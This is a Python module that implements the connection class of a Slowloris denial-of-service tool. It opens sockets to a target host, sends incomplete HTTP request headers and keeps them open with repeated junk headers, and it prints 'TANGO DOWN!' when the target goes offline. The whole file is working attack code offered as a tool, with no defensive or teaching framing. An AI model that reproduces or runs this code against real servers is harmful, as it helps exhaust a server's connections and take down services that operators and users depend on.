"""This module implements the SlowLoris connection."""

import random
import socket

class LorisConnection:
    """SlowLoris connection."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.connect((self.host, self.port))
        except TimeoutError:
            print("TANGO DOWN! (Host={}, Port={}, Status='offline')".format(self.host, self.port))
            raise
        # TODO: Add SSL support

    def close(self):
        """Closes the connection."""
        self.socket.close()

    def send_headers(self, uagent):
        """Sends headers."""
        template = "GET /?{} HTTP/1.1\r\n{}\r\nAccept-language: en-US,en,q=0.5\r\n"
        self.socket.send(template.format(random.randrange(0, 2000), uagent).encode("ascii"))
        return self

    def keep_alive(self):
        """Sends keep-alive headers."""
        self.socket.send("X-a: {}\r\n".format(random.randrange(1, 5000)).encode("ascii"))
